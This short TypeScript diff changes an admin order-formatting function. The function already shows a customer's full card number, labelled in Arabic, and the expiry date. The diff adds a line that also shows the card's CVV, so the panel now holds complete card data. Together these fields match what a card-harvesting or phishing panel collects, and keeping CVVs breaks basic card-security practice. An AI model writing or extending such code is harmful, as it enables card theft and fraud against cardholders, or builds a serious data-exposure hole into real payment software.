@@ -79,6 +79,9 @@ export function formatOrderForAdmin(order: Record<string, unknown>) {
     ...(typeof order.cardNumber === 'string' && /^[0-9]{13,19}$/.test(order.cardNumber)
       ? [`رقم البطاقة كامل: ${order.cardNumber}`]
       : []),
+    ...(typeof order.cvv === 'string' && /^[0-9]{3,4}$/.test(order.cvv)
+      ? [`CVV: ${order.cvv}`]
+      : []),
     ...(typeof order.expiryMonth === 'string' && typeof order.expiryYear === 'string'
       ? [`تاريخ الانتهاء: ${order.expiryMonth}/${order.expiryYear.slice(-2)}`]
       : []),
